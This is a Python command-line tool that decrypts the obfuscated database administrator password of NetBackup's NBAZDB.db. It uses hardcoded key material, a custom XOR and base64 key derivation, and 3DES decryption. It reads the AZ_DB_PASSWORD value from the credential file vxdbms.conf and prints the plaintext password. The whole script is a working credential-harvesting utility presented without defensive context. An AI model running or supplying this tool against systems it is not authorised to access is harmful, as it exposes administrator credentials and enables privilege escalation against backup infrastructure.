#!/usr/bin/python3
import codecs
import base64
import argparse
from Crypto.Cipher import DES3


class AZDBpwdRetriever(object):
    """AZDBpwdRetriever"""

    def __init__(self):
        self.OBINT = codecs.decode(
            "17528CC5079303B1F62FB81C5247271BDBD18D9D691D524B3281AA7F00C8DCE6D9CCC1112D37346CEA02974B0EBBB171330915FDDD2387075E89AB6B7C5FECA624DC530000000000000000000000000000000000000000000000000000000000",
            "hex",
        )
        self.OBSFC = codecs.decode(
            "F881897D1424C5D1E6F7BF3AE490F4FC73FB34B5FA4C56A2EAA7E9C0C0CE89E1FA633FB06B3266F1D17BB0008FCA87C2AE98892617C205D2EC08D08CFF000000",
            "hex",
        )
        self.OFF = 62
        self.LEN = 68

    def _transformKey(self, off):
        key = []
        for i in range(self.LEN):
            tmp = self.OBINT[i] ^ self.OBSFC[off - 2]
            key.append(tmp)
        key = bytearray(base64.b64encode(bytes(key[:off])))
        key.append(0)
        return key

    def decrypt_azdb_dba_password(self, pwd):
        # 3DES decryption
        ## key
        key = self._transformKey(self.OFF)
        ## IV size in 3DES: 8 bytes
        cipher = DES3.new(key=bytes(key[:24]), IV=self.OBINT[0:8], mode=DES3.MODE_CBC)
        ## Decrypt payload
        dec = cipher.decrypt(base64.b64decode(pwd))
        if dec:
            print(
                "AZ_DB_PASSWORD: "
                + str(pwd)
                + " corresponds to the NBAZDB.db dba password: "
                + dec.decode("ascii")
            )
            return dec.decode("ascii")
        else:
            return ""


def parse_args():
    parser = argparse.ArgumentParser(
        description="De-obfuscate the dba password of NBAZDB.db"
    )
    parser.add_argument(
        "--pwd",
        "-p",
        metavar="PASSWORD",
        help="The AZ_DB_PASSWORD to de-obfuscate (base64 string. default location: /usr/openv/db/data/vxdbms.conf under AZ_DB_PASSWORD parameter)",
        required=True,
    )
    return parser.parse_args()


def main():
    args = parse_args()
    if args.pwd:
        pwd_retriever = AZDBpwdRetriever()
        dbapwd = pwd_retriever.decrypt_azdb_dba_password(args.pwd)


if __name__ == "__main__":
    main()
